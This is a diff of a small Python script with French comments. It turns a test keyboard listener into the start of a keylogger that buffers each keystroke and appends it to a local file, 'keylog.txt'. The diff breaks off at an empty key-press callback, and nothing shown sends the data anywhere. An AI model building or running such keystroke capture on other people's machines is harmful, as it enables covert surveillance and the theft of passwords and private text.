@@ -6,16 +6,31 @@ from datetime import datetime #horaire chaque frape
 
 import os
 
-################# HOOKS SYSTEME ########
-def action_clavier(key):
+#───────────────────────── HOOKS SYSTEME ─────────────────────────
+
+# ── CONFIGURATION ────────────────────────────────────────────
+
+LOG_FILE = "keylog.txt" #data teste 
+BUFFER_SIZE = 20 #attendre pour pas reouvrire a chaque foi sinon bug
+
+# ── VARIABLES GLOBALES ───────────────────────────────────────
+buffer = []
+
+lock = threading.Lock()
+
+# ── FONCTIONS UTILITAIRES ────────────────────────────────────
+def format_key(key):
     try:
-        if key.char == 'q':
-            print("teste")
-            return False
-        print("teste 2")
+        return key.char
     except AttributeError:
-        pass
+        return f"[{key.name}]"
 
-with keyboard.Listener(on_press=action_clavier) as listener:
-    listener.join()
+def flush_buffer():
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write("".join(buffer))
 
+    buffer.clear()#vide la liste aprés ecrit 
+
+# ── CALLBACKS : LE CŒUR DU LISTENER ─────────────────────────
+def onpress(key):
+    
